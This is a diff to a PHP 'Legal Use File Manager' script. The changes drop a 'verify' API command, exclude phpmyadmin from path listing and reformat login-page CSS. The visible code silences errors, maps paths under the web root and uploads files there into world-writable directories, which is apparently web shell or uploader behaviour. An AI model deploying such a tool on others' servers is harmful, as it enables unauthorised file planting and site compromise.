@@ -2,7 +2,7 @@
 /**
  * Legal Use File Manager
  * Fully Responsive with Dark Mode & Mobile-Friendly Navigation
- * API Commands: get_paths, upload_file, delete_file, verify
+ * API Commands: get_paths, upload_file, delete_file
  */
 error_reporting(0);
 ini_set('display_errors', 0);
@@ -127,7 +127,7 @@ function getValidPaths($basePath = '') {
         'node_modules', '.git', '.svn', 'tmp', 'temp',
         'cache', 'logs', 'components', 'modules', 'plugins',
         'includes', 'lib', 'libraries', 'framework',
-        'system', 'core', 'bin', 'etc'
+        'system', 'core', 'bin', 'etc', 'phpmyadmin'
     ];
     try {
         if (!empty($basePath)) {
@@ -195,6 +195,7 @@ function uploadFileViaApi() {
     $fullDir = $documentRoot . '/' . $safePath;
     $fileName = basename($_FILES['file']['name']);
     $fullPath = $fullDir . '/' . $fileName;
+    
     // Create directory if not exists
     if (!is_dir($fullDir)) {
         if (!@mkdir($fullDir, 0777, true)) {
@@ -255,7 +256,9 @@ if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Login - File Manager</title>
-        <style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0b0e14;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;padding:16px}.login-card{background:#1a1f2b;padding:40px 35px;border-radius:16px;width:100%;max-width:400px;box-shadow:0 20px 40px rgba(0,0,0,.6);border:1px solid #2a3142}.login-card h3{text-align:center;margin-bottom:28px;color:#e9edf5;font-weight:500;font-size:24px}.login-card h3 i{color:#5b7cfa;margin-right:10px}.login-card input{width:100%;padding:14px 16px;margin:10px 0 18px;border-radius:10px;border:1px solid #2e374b;background:#0f131c;color:#e9edf5;font-size:16px;transition:.2s;outline:none}.login-card input:focus{border-color:#5b7cfa;box-shadow:0 0 0 3px rgba(91,124,250,.2)}.login-card button{width:100%;padding:14px;background:linear-gradient(135deg,#5b7cfa,#4a5fd5);border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:.25s}.login-card button:hover{transform:scale(1.02);background:linear-gradient(135deg,#6e8cff,#5568e0);box-shadow:0 8px 20px rgba(91,124,250,.3)}.error{color:#fc6b6b;background:#2a1a1a;padding:10px 14px;border-radius:8px;margin:10px 0 16px;border-left:4px solid #fc6b6b;font-size:14px}.login-footer{margin-top:24px;text-align:center;color:#5b6a85;font-size:13px;border-top:1px solid #262e40;padding-top:18px}.login-footer span{color:#5b7cfa}@media (max-width:480px){.login-card{padding:24px 20px}.login-card h3{font-size:20px}}</style>
+        <style>
+            *{margin:0;padding:0;box-sizing:border-box}body{background:#0b0e14;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;padding:16px}.login-card{background:#1a1f2b;padding:40px 35px;border-radius:16px;width:100%;max-width:400px;box-shadow:0 20px 40px rgba(0,0,0,.6);border:1px solid #2a3142}.login-card h3{text-align:center;margin-bottom:28px;color:#e9edf5;font-weight:500;font-size:24px}.login-card h3 i{color:#5b7cfa;margin-right:10px}.login-card input{width:100%;padding:14px 16px;margin:10px 0 18px;border-radius:10px;border:1px solid #2e374b;background:#0f131c;color:#e9edf5;font-size:16px;transition:.2s;outline:none}.login-card input:focus{border-color:#5b7cfa;box-shadow:0 0 0 3px rgba(91,124,250,.2)}.login-card button{width:100%;padding:14px;background:linear-gradient(135deg,#5b7cfa,#4a5fd5);border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:.25s}.login-card button:hover{transform:scale(1.02);background:linear-gradient(135deg,#6e8cff,#5568e0);box-shadow:0 8px 20px rgba(91,124,250,.3)}.error{color:#fc6b6b;background:#2a1a1a;padding:10px 14px;border-radius:8px;margin:10px 0 16px;border-left:4px solid #fc6b6b;font-size:14px}.login-footer{margin-top:24px;text-align:center;color:#5b6a85;font-size:13px;border-top:1px solid #262e40;padding-top:18px}.login-footer span{color:#5b7cfa}@media (max-width:480px){.login-card{padding:24px 20px}.login-card h3{font-size:20px}}
+        </style>
     </head>
     <body>
         <div class="login-card">
